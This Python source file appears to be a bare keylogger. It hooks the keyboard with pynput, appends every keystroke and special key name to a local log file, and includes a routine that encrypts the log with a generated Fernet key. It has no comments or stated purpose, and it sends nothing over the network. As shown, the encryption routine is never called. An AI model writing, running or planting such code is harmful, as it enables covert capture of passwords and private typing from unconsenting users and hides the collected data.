from pynput import keyboard
from cryptography.fernet import Fernet
import os

LOG_FILE = "key_log.txt"
KEY_FILE = "key.key"

def generate_key():
    if not os.path.exists(KEY_FILE):
        key = Fernet.generate_key()
        with open(KEY_FILE, "wb") as key_file:
            key_file.write(key)

def load_key():
    with open(KEY_FILE, "rb") as key_file:
        return key_file.read()

def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(key.char)
    except AttributeError:
        with open(LOG_FILE, "a") as f:
            f.write(f"[{key.name}]")

def start_listener():
    generate_key()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def encrypt_log():
    key = load_key()
    fernet = Fernet(key)

    with open(LOG_FILE, "rb") as file:
        original = file.read()

    encrypted = fernet.encrypt(original)

    with open(LOG_FILE, "wb") as encrypted_file:
        encrypted_file.write(encrypted)
